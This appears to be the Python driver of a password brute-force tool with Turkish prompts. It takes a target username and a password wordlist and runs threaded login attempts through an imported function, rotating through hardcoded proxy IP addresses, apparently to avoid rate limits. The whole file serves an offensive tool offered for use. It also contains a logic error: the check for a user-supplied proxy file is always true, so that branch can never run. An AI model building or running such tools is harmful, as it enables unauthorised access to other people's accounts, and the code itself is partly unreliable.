import functoin as fc
import proxies_check

import threading
import os
os.system("clear")
pro = input("proxy kullanmak ister misiniz(kendi proxy listeniz varsa tavsiye edilen kullanılmasıdır)(y/n): ")
inputName = input("Kullanıcı adınızı giriniz: ")
sifre = input("Şifre dosya yolunu giriniz: ")
if "y" in pro.lower(): 


    own_prox =  input("kendi proxy listeniz varsa txt dosyası halinde dosyayı girinz yoksa [ENTER] tuşuna basın: ")
    if "" in own_prox:
        
                        
        proxy_list = [
            "147.93.128.199:8888", 
            "200.174.198.86:8888" 

        ]
        proxies_check.prox(proxy_list)

        print("Şifreler deneniyor, lütfen bekleyin...")
        try:
            threads = []
            for proxy in proxy_list:
                thread = threading.Thread(target=fc.islemFonk, args=(inputName, sifre, proxy))
                threads.append(thread)
                thread.start()

            for t in threads:
                t.join()

        except Exception as e:
            print(f"Bilinmeyen bir hata oldu, hata ---> {e}")
    else:
        try:
            proxies_check.prox(own_prox)
            threads = []
            own_prox_list=[]
            with open(own_prox, "r") as op:
                 for ops in op:
                    ops = ops.split()
                    own_prox_list.append(ops)  
            for proxy in own_prox_list:
                thread = threading.Thread(target=fc.islemFonk, args=(inputName, sifre, proxy))
                threads.append(thread)
                thread.start()

            for t in threads:
                t.join()

        except Exception as e:
            print(f"Bilinmeyen bir hata oldu, hata ---> {e}")

else:
    print("Şifreler deneniyor, lütfen bekleyin...")
    try:
            threads = []
            
            thread = threading.Thread(target=fc.islemFonk, args=(inputName, sifre,None))
            threads.append(thread)
            thread.start()

            for t in threads:
                t.join()

    except Exception as e:
            print(f"Bilinmeyen bir hata oldu, hata ---> {e}")